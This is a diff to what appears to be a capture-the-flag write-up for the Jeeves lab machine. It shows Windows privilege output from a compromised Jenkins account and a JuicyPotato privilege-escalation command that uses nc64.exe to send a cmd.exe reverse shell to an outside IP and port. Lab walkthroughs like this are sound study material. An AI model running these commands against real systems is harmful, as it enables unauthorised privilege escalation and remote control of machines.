@@ -136,6 +136,28 @@ Microsoft Windows [Version 10.0.10586]
 C:\Users\Administrator\.jenkins>whoami
 whoami
 jeeves\kohsuke
+
+C:\Users\Administrator\.jenkins>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
 ```
 
-Jeeves
+If we check the privileges the user we have compromised has, we see that `SeImpersonatePrivilege` is enabled.
+
+```bash
+JuicyPotato.exe -l 1337 -p nc64.exe -a "10.10.14.19 6667 -e cmd.exe" -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
+```
+
+JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/k whoami" -t * -c {CLSID}
